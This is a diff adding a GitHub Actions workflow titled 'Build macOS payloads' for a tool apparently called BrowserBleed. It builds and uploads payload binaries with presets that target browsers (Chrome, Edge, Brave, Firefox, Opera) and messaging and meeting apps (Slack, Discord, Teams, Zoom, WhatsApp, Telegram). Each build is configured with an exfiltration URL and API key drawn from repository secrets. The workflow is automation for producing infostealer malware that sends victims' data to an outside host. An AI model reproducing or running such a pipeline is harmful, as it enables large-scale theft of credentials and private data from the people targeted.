@@ -1,0 +1,35 @@
+name: Build macOS payloads
+
+on:
+  workflow_dispatch:
+  push:
+    branches: [master]
+    paths:
+      - 'BrowserBleed_mac.py'
+      - 'build_mac.sh'
+      - 'browserbleed/**'
+
+jobs:
+  build:
+    runs-on: macos-latest
+
+    steps:
+      - uses: actions/checkout@v4
+
+      - uses: actions/setup-python@v5
+        with:
+          python-version: "3.12"
+
+      - name: Install dependencies
+        run: pip install cryptography nuitka zstandard
+
+      - name: Build and upload payloads
+        env:
+          EXFIL_URL: https://${{ secrets.DOMAIN }}
+          EXFIL_KEY: ${{ secrets.BB_API_KEY }}
+        run: |
+          chmod +x build_mac.sh
+          for p in chrome edge brave firefox opera slack discord teams zoom whatsapp telegram; do
+            echo "=== BUILDING $p ==="
+            ./build_mac.sh --preset "$p" --exfil-url "$EXFIL_URL" --exfil-key "$EXFIL_KEY" --upload || echo "FAILED $p"
+          done
